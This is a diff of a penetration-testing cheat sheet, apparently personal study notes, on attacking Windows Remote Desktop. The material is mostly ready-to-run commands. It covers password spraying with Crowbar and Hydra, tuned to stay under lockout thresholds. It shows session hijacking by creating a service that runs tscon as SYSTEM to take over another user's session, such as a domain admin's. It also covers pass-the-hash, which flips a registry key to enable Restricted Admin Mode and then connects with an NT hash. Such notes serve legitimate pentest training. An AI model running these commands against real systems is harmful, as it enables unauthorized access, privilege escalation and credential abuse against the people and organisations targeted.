@@ -1,78 +1,63 @@
-## RDP Enumeration and Password Spraying
+# Attacking RDP
 
-RDP open on TCP/3389 with a need to identify valid credentials while bypassing **account lockout policies**.
+RDP on TCP/3389. Spray before brute — lockout risk.
 
-Identify the service and port state
+Password spray with Crowbar:
 
-```
-nmap -Pn -p3389 <TARGET_IP>
-```
-
-Perform password spraying using Crowbar to test one password against multiple users
-
-```
-crowbar -b rdp -s <TARGET_IP>/32 -U <FILE_PATH> -c '<PASSWORD>'
+```bash
+crowbar -b rdp -s <TARGET>/32 -U <USERLIST> -c '<PASS>'
 ```
 
-Perform password spraying using Hydra with throttled connections to avoid service instability
+Or Hydra — limit threads, RDP doesn't like parallel connections:
 
-```
-hydra -L <FILE_PATH> -p '<PASSWORD>' <TARGET_IP> rdp
+```bash
+hydra -L <USERLIST> -p '<PASS>' <TARGET> rdp -t 4 -W 3
 ```
 
-- Crowbar
-    
-    - `crowbar -b rdp -s <TARGET_IP>/32 -U <FILE_PATH> -c '<PASSWORD>'`
-    - Prefer for straightforward RDP-specific spraying.
-- Hydra
-    
-    - `hydra -L <FILE_PATH> -p '<PASSWORD>' <TARGET_IP> rdp`
-    - Prefer when granular control over connection speed and parallel tasks is required to prevent **service crashes**.
-- **Account lockout** will trigger if the password policy is exceeded; spray a single password across the user list before switching to a new one.
-    
-- **RDP connection limits** often cause Hydra to fail; use `-t 1` or `-W 1` to reduce parallel tasks and wait between attempts.
-    
+Connect with valid creds:
+
+```bash
+xfreerdp /v:<TARGET> /u:<USER> /p:<PASS>
+rdesktop -u <USER> -p <PASS> <TARGET>
+```
+
+---
 
 ## RDP Session Hijacking
 
-A machine is compromised with **local administrator** access and other active user sessions exist for impersonation.
+Requires local admin on a host where other users have active RDP sessions. Hijack their session without knowing their password → if they're DA, you are too.
 
-List active sessions to find a target UserID and the current session name
+Check active sessions:
 
-```
+```cmd
 query user
 ```
 
-Create a system service to execute the hijack command as **SYSTEM**
+Create a service that runs `tscon` as SYSTEM to steal the target session:
 
-```
-sc.exe create <SERVICE_NAME> binpath= "cmd.exe /k tscon <TARGET_SESSION_ID> /dest:<OUR_SESSION_NAME>"
-```
-
-Trigger the hijacking service to open the target's desktop
-
-```
-net start <SERVICE_NAME>
+```cmd
+sc.exe create sessionhijack binpath= "cmd.exe /k tscon <TARGET_SESSION_ID> /dest:<YOUR_SESSION_NAME>"
+net start sessionhijack
 ```
 
-- **Server 2019** prevents this specific service-based hijacking method.
-- **SYSTEM privileges** are mandatory to use `tscon.exe` for session impersonation without the target's password.
+> [!warning] Does not work on Server 2019. Works on Server 2016 and earlier.
+
+---
 
 ## RDP Pass-the-Hash
 
-GUI access is required but only the NTLM hash is available from the SAM or memory.
+Requires Restricted Admin Mode enabled on the target (disabled by default).
 
-Modify the registry to allow Restricted Admin Mode for PtH authentication
+Enable it on the target (needs admin access first):
 
-```
+```cmd
 reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
 ```
 
-Connect to the target using the NT hash
+Then PTH via xfreerdp:
 
-```
-xfreerdp /v:<TARGET_IP> /u:<USERNAME> /pth:<HASH>
+```bash
+xfreerdp /v:<TARGET> /u:<USER> /pth:<NTHASH>
 ```
 
-- **DisableRestrictedAdmin** must be set to `0x0` or the connection will be blocked by account restrictions.
-- **Plaintext credentials** are not required if the registry modification is successful and `xfreerdp` is used with the `/pth` flag.
+> [!warning] `/pth` only works if `DisableRestrictedAdmin` is set to `0` on the target. If you get an "account restrictions" error, the reg key isn't set. You need some form of prior access to enable it first.
